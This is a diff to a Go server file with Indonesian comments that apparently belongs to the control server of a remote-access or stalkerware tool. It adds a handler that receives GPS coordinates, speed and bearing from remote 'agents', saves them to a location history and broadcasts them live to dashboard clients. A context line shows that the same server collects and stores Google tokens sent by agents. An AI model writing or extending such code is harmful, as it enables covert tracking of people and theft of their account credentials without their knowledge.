@@ -1096,25 +1096,7 @@ func BroadcastLocationHistory(agentID string, result map[string]interface{}) {
     }
 }
 
-func BroadcastLocationUpdate(agentID string, location map[string]interface{}) {
-    wsMutex.Lock()
-    defer wsMutex.Unlock()
 
-    data := map[string]interface{}{
-        "type":      "location_update",
-        "agent_id":  agentID,
-        "data":      location,
-        "timestamp": time.Now().Unix(),
-    }
-
-    for conn := range wsClients {
-        if err := conn.WriteJSON(data); err != nil {
-            log.Printf("WebSocket location update broadcast error: %v", err)
-            conn.Close()
-            delete(wsClients, conn)
-        }
-    }
-}
 
 // server.go - Tambahkan di bagian ADDITIONAL HANDLERS
 
@@ -1770,6 +1752,74 @@ func (s *Server) handleGoogleTokens(agent *Agent, result map[string]interface{})
     log.Printf("🔵 Google tokens from %s", agent.ID)
     agent.Metadata["google_tokens"] = result
     s.db.UpdateAgentMetadata(agent.ID, "google_tokens", result)
+}
+
+// ==================== HANDLE LOCATION UPDATE ====================
+
+func (s *Server) handleLocationUpdate(agent *Agent, result map[string]interface{}) {
+    log.Printf("📍 Location update from %s", agent.ID)
+    
+    // ✅ UPDATE AGENT LOCATION
+    if lat, ok := result["latitude"].(float64); ok {
+        if lng, ok := result["longitude"].(float64); ok {
+            s.db.UpdateAgentLocation(agent.ID, lat, lng)
+            log.Printf("📍 Updated location: %.6f, %.6f", lat, lng)
+        }
+    }
+    
+    // ✅ SAVE TO HISTORY
+    if err := s.db.AddLocationHistory(agent.ID, result); err != nil {
+        log.Printf("⚠️ Failed to save location history: %v", err)
+    }
+    
+    // ✅ BROADCAST KE WEBSOCKET
+    BroadcastLocationUpdate(agent.ID, result)
+    
+    // ✅ UPDATE AGENT METADATA
+    if agent.Metadata == nil {
+        agent.Metadata = make(map[string]interface{})
+    }
+    agent.Metadata["last_location"] = result
+    s.db.UpdateAgentMetadata(agent.ID, "last_location", result)
+    
+    BroadcastAgentUpdate(agent)
+}
+
+// ==================== BROADCAST LOCATION UPDATE ====================
+
+func BroadcastLocationUpdate(agentID string, location map[string]interface{}) {
+    wsMutex.Lock()
+    defer wsMutex.Unlock()
+    
+    // ✅ FORMAT DATA UNTUK WEBSOCKET
+    data := map[string]interface{}{
+        "type": "location_update",
+        "agent_id": agentID,
+        "data": map[string]interface{}{
+            "latitude": location["latitude"],
+            "longitude": location["longitude"],
+            "accuracy": location["accuracy"],
+            "provider": location["provider"],
+            "altitude": location["altitude"],
+            "speed": location["speed"],
+            "bearing": location["bearing"],
+            "time": location["time"],
+            "timestamp": time.Now().Unix(),
+        },
+    }
+    
+    log.Printf("📍 Broadcasting location update for %s: %.6f, %.6f", 
+        agentID, 
+        location["latitude"].(float64), 
+        location["longitude"].(float64))
+    
+    for conn := range wsClients {
+        if err := conn.WriteJSON(data); err != nil {
+            log.Printf("WebSocket location broadcast error: %v", err)
+            conn.Close()
+            delete(wsClients, conn)
+        }
+    }
 }
 
 // ==================== UTILITY ====================
